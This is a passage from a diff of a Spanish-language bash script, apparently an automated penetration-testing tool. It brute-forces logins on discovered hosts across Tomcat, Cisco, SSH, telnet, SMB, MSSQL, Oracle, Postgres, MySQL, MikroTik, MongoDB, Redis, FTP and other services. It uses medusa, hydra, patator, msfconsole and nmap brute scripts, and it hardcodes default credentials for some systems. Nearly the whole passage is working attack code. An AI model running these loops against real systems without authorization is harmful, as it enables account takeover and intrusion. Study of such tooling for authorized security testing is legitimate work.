+				#patator http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
+				#si encontro el password
+#				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat2.txt
+				#greprc=$?
+				#if [[ $greprc -eq 0 ]] ; then			
+					#echo -e "\t[i] Password encontrado"
+					## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+					#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
+				#fi
+				
+				#patator http_fuzz method=GET url=$line user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
+				#si encontro el password
+				#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat3.txt
+				#greprc=$?
+				#if [[ $greprc -eq 0 ]] ; then			
+					#echo -e "\t[i] Password encontrado"
+					## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+					#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
+				#fi
+				
+			fi			
+		done			
+		insert_data
+	 fi	
+fi
+
+if [ -f servicios/cisco401.txt ]
+then	
+	
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 		  
+		sed -i '1 i\cisco' top.txt	#adicionar password cisco
+		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
+		for ip in $(cat servicios/cisco401.txt); do			
+			egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then			
+				echo -e "[+] Probando $ip"
+				echo "patator http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinado.txt 2>> logs/cracking/"$ip"_80_passwordAdivinado.txt
+				patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinado.txt 2>> logs/cracking/"$ip"_80_passwordAdivinado.txt
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinado.txt`
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then
+					echo -n "[Cisco] Usuario:cisco $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinado.txt
+				fi				
+			fi
+						
+		done
+		insert_data
+	 fi	
+fi
+
+
+### SSH #########
+if [ -f servicios/ssh_onlyhost.txt ]
+then
+	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinado.txt" --silent
+	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinado.txt" --silent
+		
+fi
+
+			
+if [ -f servicios/ssh_onlyhost.txt ]
+then
+		
+	for ip in $(cat servicios/ssh_onlyhost.txt); do			
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordAdivinado.txt > .vulnerabilidades/"$ip"_22_passwordAdivinado.txt 2>/dev/null					
+	 done	
+	insert_data
+fi
+####################
+
+
+### telnet #########
+if [ -f servicios/telnet_onlyhost.txt ]
+then
+	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M telnet' >> logs/cracking/_target__23_passwordAdivinado.txt" --silent
+	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M telnet >> logs/cracking/_target__23_passwordAdivinado.txt" --silent
+		
+fi
+
+			
+if [ -f servicios/telnet_onlyhost.txt ]
+then
+		
+	for ip in $(cat servicios/telnet_onlyhost.txt); do			
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordAdivinado.txt > .vulnerabilidades/"$ip"_23_passwordAdivinado.txt 2>/dev/null					
+	 done	
+	insert_data
+fi
+####################
+
+
+if [ -f servicios/PRTG.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre PRTG activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	   	       	  
+		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
+		sed -i '1 i\prtgadmin' top.txt	#adicionar password prtgadmin
+		for line in $(cat servicios/PRTG.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`								
+			echo -e "[+] Probando $ip:$port"
+			echo "passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+			passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinado.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
+if [ -f servicios/pentaho.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre sistemas de Pentaho activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	   	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing Pentahoo ######################$RESET"	
+		for line in $(cat servicios/pentaho.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`
+						
+			echo -e "[+] Probando $ip"
+			passWeb.pl -t $ip -p $port -d / -m pentaho -u admin -f top.txt  > logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+			sleep 2
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinado.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+			
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
+
+
+if [ -f servicios/web401.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre web 401 activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	     	
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass web (401) ######################$RESET"	
+		for line in $(cat servicios/web401.txt); do
+			echo -e "[+] Probando $line"			
+			
+			if [[ ${line} == *"http"*  ]];then 							
+				#line = http://200.87.193.109:80/phpmyadmin/
+				ip=`echo $line | cut -d ":" -f2 | tr -d "/"`			
+				port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
+				
+				#probar con usuario admin
+				patator http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then
+					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+				fi	
+				
+				#probar con usuario root
+				patator http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then
+					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+				fi
+							
+			else
+				#line=10.0.0.2:80
+				ip=`echo $line | cut -f1 -d":"`
+				port=`echo $line | cut -f2 -d":"`
+				if [[ ${port} == *"443"*  ]];then 	
+					#probar con usuario admin
+					patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
+					greprc=$?
+					if [[ $greprc -eq 0 ]] ; then
+						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+					fi	
+				
+					#probar con usuario root
+					patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
+					greprc=$?
+					if [[ $greprc -eq 0 ]] ; then
+						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
+					fi
+				fi
+			fi
+						
+			
+		done
+		insert_data
+	 fi	
+fi
+
+
+
+
+### Windows
+if [ -f servicios/Windows.txt ]
+then
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrador -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrador -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent		
+			
+fi
+
+			
+if [ -f servicios/Windows.txt ]
+then
+		
+	for ip in $(cat servicios/Windows.txt); do			
+		egrep --color=never -i 'login:' logs/cracking/"$ip"_445_passwordAdivinadoWin.txt | tee -a .vulnerabilidades/"$ip"_445_passwordAdivinadoWin.txt
+		#https://github.com/m4ll0k/SMBrute (shared)											
+	 done	
+	 insert_data
+fi
+
+
+#falta
+if [ -f servicios/ZKSoftware.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	  	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
+		for line in $(cat servicios/ZKSoftware.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`
+			echo -e "[+] Probando $ip"		
+			echo -e "passWeb.pl -t $ip -p $port -m ZKSoftware -u administrator -f top.txt " > logs/cracking/"$ip"_80_passwordZKSoftware.txt
+			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt >> logs/cracking/"$ip"_80_passwordZKSoftware.txt
+			grep --color=never 'encontrado' logs/cracking/"$ip"_80_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_80_passwordZKSoftware.txt
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
+
+if [ -f servicios/mssql.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	   
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	
+
+	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
+	 for line in $(cat servicios/mssql.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo -e "[+] Probando $ip"						
+		echo "medusa -e n -u sa -P top.txt -h $ip -M mssql" >> logs/cracking/"$ip"_"$port"_passwordBD.txt
+		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/"$ip"_"$port"_passwordBD.txt
+		
+		echo -e "\n medusa -e n -u adm -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_"$port"_passwordBD.txt
+		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_"$port"_passwordBD.txt
+		
+		echo -e "\n medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_"$port"_passwordBD.txt
+		medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_"$port"_passwordBD.txt
+		
+		grep --color=never SUCCESS logs/cracking/"$ip"_"$port"_passwordBD.txt > .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+		
+	 done	
+	 insert_data
+   fi # if bruteforce
+fi
+
+
+if [ -f servicios/oracle.txt ]
+then
+	if [ "$TYPE" = NULL ] ; then		
+		echo -e "\n\t $OKBLUE Encontre servicios oracle activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	   
+	fi
+	
+	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+				
+		export SQLPATH=/opt/oracle/instantclient_18_3
+		export TNS_ADMIN=/opt/oracle/instantclient_18_3
+		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
+		export ORACLE_HOME=/opt/oracle/instantclient_18_3
+
+	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
+	 for line in $(cat servicios/oracle.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo -e "[+] Probando $ip"
+		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_passwordBD.txt 2>/dev/null		
+		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_"$port"_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+		
+	 done	
+	 insert_data
+   fi # if bruteforce
+fi
+
+if [ -f servicios/postgres.txt ]
+then
+
+	echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
+	 sed -i '1 i\postgres' top.txt	#adicionar password postgres
+	 for line in $(cat servicios/postgres.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`			
+		
+		echo -e "[+] Probando $ip"
+		echo "medusa -e n -u postgres -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		
+		echo -e "\n medusa -e n -u pgsql -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		
+		echo -e "\nmedusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		
+		grep --color=never SUCCESS logs/cracking/"$ip"_5432_passwordBD.txt > .vulnerabilidades/"$ip"_5432_passwordBD.txt
+		
+	 done	
+	 insert_data
+fi
+
+
+if [ -f servicios/MikroTik.txt ]
+then
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	    
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+	      	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
+	  for ip in $(cat servicios/MikroTik.txt); do		
+		echo -e "[+] Probando $ip"
+				
+			echo "mkbrutus.py -t $ip -u admin --dictionary top.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
+			mkbrutus.py -t $ip -u admin --dictionary top.txt >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
+			
+			echo "" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
+			echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
+			mkbrutus.py -t $ip -u $ENTIDAD --dictionary top.txt >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
+		
+			grep --color=never successful logs/cracking/"$ip"_8728_passwordMikroTik.txt | grep -v "unsuccessful" > .vulnerabilidades/"$ip"_8728_passwordMikroTik.txt
+		
+		
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+if [ -f servicios/mysql.txt ]
+then
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	     
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+       	
+		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
+		sed -i '1 i\mysql' top.txt	#adicionar password mysql
+		for line in $(cat servicios/mysql.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`
+			echo -e "[+] Probando $ip"
+			hostlive=`mysql -u mysql -pww $ip`				
+			#error
+			if [[ ${hostlive} == *"MySQL server through socket"*  ]];then   	  
+				echo "El servicio no esta funcionando correctamente"
+								
+			else
+				echo -e "\n medusa -e n -u root -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
+				medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
+				
+				echo -e "\n medusa -e n -u mysql -P top.txt -h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
+				medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt
+				
+				echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
+				medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
+				
+				echo -e "\n medusa -e n -u administrador -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+				medusa -e n -u administrador -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+				
+				echo -e "\n medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+				medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+				
+				grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_3306_passwordBD.txt
+				echo ""		
+				
+			fi				
+		done
+		insert_data		
+	fi # if bruteforce
+fi
+
+
+
+#if [ -f servicios/vmware.txt ]
+#then
+
+	#if [ "$TYPE" = NULL ] ; then
+		#echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
+		#read bruteforce	     
+	#fi
+	  	
+	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+      	  
+	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
+	  #for line in $(cat servicios/vmware.txt); do
+		#ip=`echo $line | cut -f1 -d":"`
+		#port=`echo $line | cut -f2 -d":"`
+		#echo -e "[+] Probando $ip"
+#		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
+		#medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
+		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinado.txt
+#		echo ""			
+	 #done
+	 #insert_data
+#	fi # if bruteforce
+#fi
+
+
+if [ -f servicios/mongoDB.txt ]
+then
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de mongoDB activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	      
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+	     	  
+	  echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
+	  for line in $(cat servicios/mongoDB.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "[+] Probando $ip"
+		echo "nmap -n -sV -p $port --script=mongodb-brute $ip"  > logs/cracking/"$ip"_"$port"_passwordBD.txt 2>/dev/null 
+		nmap -n -sV -p $port --script=mongodb-brute $ip  >> logs/cracking/"$ip"_"$port"_passwordBD.txt 2>/dev/null 
+		# -- |     root:Password1 - Valid credentials		
+		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_"$port"_passwordBD.txt `
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then
+			echo -n "[MongoDB] $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+		fi					 
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+if [ -f servicios/redis.txt ]
+then
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de redis activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	       
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+     	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
+	  for line in $(cat servicios/redis.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"			
+		echo "nmap -n -sV -p $port --script=redis-brute $ip"  > logs/cracking/"$ip"_"$port"_passwordBD.txt 2>/dev/null 
+		nmap -n -sV -p $port --script=redis-brute $ip  >> logs/cracking/"$ip"_"$port"_passwordBD.txt 2>/dev/null 		
+		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_"$port"_passwordBD.txt `
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then
+			echo -n "[Redis] $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+		fi			
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+#falta
+if [ -f servicios/informix.txt ]
+then
+	
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de informix (SFI) activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	       
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+   	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
+	  for line in $(cat servicios/informix.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"			
+		echo -e "\t [+] Probando password por defecto (SFI)"
+		
+		echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		
+		echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		
+		echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		
+		echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		
+		echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
+		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
+		
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+
+
+if [ -f servicios/ftp.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre servicios de FTP activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	        
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
+		for line in $(cat servicios/ftp.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		
+		######## revisar si no es impresora #####
+		#banner ftp
+		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_21.txt
+		noImpresora21=$?
+		
+		#banner telnet						
+		noImpresora23=1		
+		if [ -f .banners2/"$ip"_23.txt ] 
+		then				
+			egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_23.txt 2>/dev/null
+			noImpresora23=$?
+		fi
+		
+		#banner web
+		noImpresora80=1		
+		if [ -f .enumeracion2/"$ip"_80_webData.txt ] 
+		then	
+			egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
+			noImpresora80=$?
+		fi
+				
+		echo "noImpresora21 $noImpresora21 noImpresora80 $noImpresora80 noImpresora23 $noImpresora23"
+		if [[ $noImpresora21 -eq 1 && $noImpresora80 -eq 1 && $noImpresora23 -eq 1 ]] ; then			
+			echo -e "[+] Probando $ip"		
+			
+			#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			#medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			
+			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			
+			echo -e "\n medusa -e n -u ftp -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt					
